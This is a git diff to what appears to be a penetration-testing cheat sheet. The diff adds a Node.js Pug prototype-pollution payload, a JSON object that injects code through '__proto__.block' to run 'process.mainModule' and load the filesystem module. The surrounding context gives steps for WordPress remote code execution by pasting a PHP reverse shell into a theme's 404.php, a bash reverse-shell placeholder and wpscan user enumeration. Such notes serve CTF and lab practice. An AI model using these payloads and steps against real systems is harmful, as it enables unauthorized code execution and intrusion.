@@ -546,7 +546,6 @@ Here `api-endpoint` can be for example `/api/v1/resources/books\?FUZZ\=.bash_his
 ### Web Shell Bash
 `bash -c "<bash_rev_shell>"`
 
-
 ### Wordpress
 using wpscan we can find users or do some further enumeration of wordpress version
 * `wpscan --url http://<ip>/wordpress -e u` Enumerate Users
@@ -562,6 +561,26 @@ To get a RCE
 
 * Goto `Appearance` -> `Editor` Select the 404.php template of the current theme and paste php reverse-shell.
 * Then navigate to `http://ip/wp-content/themes/twentyfifteen/404.php` (theme name can be twentytwenty for the latest one) 
+
+### Node JS
+
+#### Prototype Pollution
+
+##### PUG
+
+```
+
+{
+    "key": "value",
+    "__proto__.block": 
+    {
+        "type": "Text",
+        "line": "test;return process.mainModule.constructor._load('fs').readdirSync('./', {encoding:'utf8', flag:'r'})",
+        "val": "THIS IS THE VALUE"
+    } 
+}
+```
+
 
 ### Apache Tomcat
 
